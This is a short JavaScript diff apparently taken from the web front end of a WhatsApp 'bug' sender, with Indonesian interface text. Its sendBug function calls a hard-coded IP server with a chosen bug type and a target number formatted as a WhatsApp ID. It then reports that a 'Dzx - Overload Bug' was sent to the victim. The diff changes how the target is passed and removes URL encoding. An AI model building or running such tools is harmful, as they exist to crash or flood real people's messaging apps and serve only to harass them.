@@ -231,7 +231,7 @@ async function sendBug() {
   btn.innerHTML = '<span class="spinner"></span> Mengirim...';
   resDiv.innerText = "";
   try {
-    const res = await fetch(`http://178.128.99.122:2054/evolution?type=${selectedBug}&chatId=${encodeURIComponent(chatId)}`);
+    const res = await fetch(`http://178.128.99.122:2054/evolution?type=${type}&chatId=${target}@s.whatsapp.net`);
     const json = await res.json();
     showPopup(`Dzx - Overload Bug successfully sent to <b>${input}</b>`);
   } catch (err) {
